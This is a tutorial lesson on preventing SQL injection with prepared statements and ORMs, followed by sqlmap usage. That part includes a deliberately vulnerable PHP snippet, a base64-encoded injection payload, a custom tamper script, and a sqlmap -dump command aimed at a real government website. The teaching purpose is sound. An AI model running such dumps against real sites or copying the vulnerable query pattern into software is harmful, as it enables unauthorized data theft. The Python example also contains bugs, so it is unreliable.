# PREVENTION AND SQLMAP - LESSON 05

## 'SQLI PREVENTION

We learned how to exploit an SQL injection, but how can we prevent it from
happening when we're programming?
The answer is simple and effective: prepared statements, libraries and ORM.
We are in 2019 and the query-wheel was invented long time ago, there is no
need to reinvent it again.

### What is a prepared statement
A prepared statement (a.k.a parameterized statement) is a feature to execute to
avoid code injections and perform similar statements repeatedly with high
efficiency.
The SQL statement is used in form of template and at each execution some
constant values are replaced with variables.
The typical flow is as follows:
1. Prepare: the app creates the SQL template with certain values, called
'parameters', 'placeholders' or 'bind variables'.
2. The DBMS parses, optimizes and translates the statement without executing it.
3. Execute: the app replace (or binds) the parameters with real values and
executes the statement.

In this way the DBMS knows what is a statement and what is a parameter and it is
impossible to trick it to get a parameter as a statement.


#### PHP PDO Example
```php
  // Database connection
  $conn = new PDO("mysql:dbname=mysql", "root");
  // Prepare the statement as a query template
  $stmt = $conn->prepare("SELECT * FROM pages WHERE id = ?");
  // Declare parameters
  $params = array(11);
  // Bind parameters to query template and execute it
  $stmt->execute($params);
  // Show results
  echo $stmt->fetch()[1];
```

#### PHP ORM Example

```php
  $capsule = new Capsule;
  $capsule->addConnection([
    'driver'    => 'mysql',
    'host'      => 'db',
    'database'  => 'sqli_chall4_0',
    'username'  => 'chall4_0',
    'password'  => 'random_password'
  ]);
  $result = $capsule->table('memes')->where('id', '=', $_GET['id'])->first();
  echo $result->title;
```

#### Node.js Example

```js
const mysql = require('mysql2');

// create the connection to database
const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  database: 'test'
});

// execute will internally call prepare and query
connection.execute(
  'SELECT * FROM `memes` WHERE `id` = ? AND `category` = ?',
  [51, 'cybersec'],
  function(err, results, fields) {
    console.log(results); // results contains rows returned by server
  }
);
```

#### Python Example

```python
import mysql.connector
connection = mysql.connector.connect(host='localhost',
                             database='memes',
                             user='memes',
                             password='password1')

cursor = connection.cursor(prepared=True)
prepstmt = "SELECT id, title FROM memes WHERE id = %s"
cur.execute(prepstmt, (15))
for row in cur:
  print row['title']
```

## 'SQLMAP
### What is sqlmap

sqlmap is an open source penetration testing tool that automates the process of
detecting and exploiting an SQL injection.

- Supports MySQL, Oracle, PostgreSQL, MSSQL, Microsoft Access, SQLite and many
others
- Supports six techniques: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries and out-of-band.
- Automatically enumerates user, password hashes, databases, roles, privileges,
tables and columns.
- Supports database dumps
- Can download and upload files
- Can automatically get RCE
- Supports other cool features

### Usage examples

<iframe src="https://asciinema.org/a/46601/embed?" id="asciicast-iframe-46601" name="asciicast-iframe-46601" scrolling="no" allowfullscreen="true" style="overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 662px; float: none; visibility: visible; height: 514px;"></iframe>

### Sqlmap tamper scripts
sqlmap can be easily extended writing sqlmap tamper scripts. This features
allow us to automate an attack that with standard sqlmap is not working.

#### Example
The developer became paranoid when a friend explained him the sql injections.
To avoid it, he implemented a base64 query parser: each parameter must be
decoded with base64 and then can be used for the real query.

```php
$id = base64_decode($_GET['id']);
$sql = "SELECT * FROM pages WHERE id = '" . $id . "'";
$result = $conn->query($sql);
while($row = $result->fetch_array()){
  print_r($row);
}
```

Parameters:
```
$_GET['id'] = 'MTEK' // 'MTEK' is 11 base64-encoded
```
Result:
```sql
SELECT * FROM pages WHERE id = '11';
```
To exploit this SQLi we have to produce the string `' or 1=1 -- -`, but we know
that the `id` parameter will be base64-decoded.
So to exploit the injection we have base64-encode our payload:

```bash
echo -n "'or 1=1 -- -" | base64 # returns J29yIDE9MSAtLSAt
```

So we will pass:
```php
$_GET['id'] = 'J29yIDE9MSAtLSAt';
```

to get this query:
```sql
SELECT * FROM pages WHERE id = '' or 1=1 -- -'
```

If we have to deal with a simple query like this it is OK to do it manually but
imagine to exploit a time-based injection in this way...it's a long travel :)

We can create a simple python script that encodes our payloads and we'll tell
to sqlmap to use it before sending its queries:

```python
#!/usr/bin/env python

from lib.core.data import kb
from lib.core.enums import PRIORITY
import base64

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    encoded_payload = base64.b64encode(payload)
    return encoded_payload
```

We save this script in `sqlmap/tamper/b64.py` and then we call sqlmap with the
`-tamper` parameter that will point to our script:

```bash
sqlmap -u "https://www.nsa.gov/news.php?id=MTEK" -tamper="b64.py" -dump
```
In this way every single payload that sqlmap wants to send to the target will
pass through our script and will be encoded in base64.
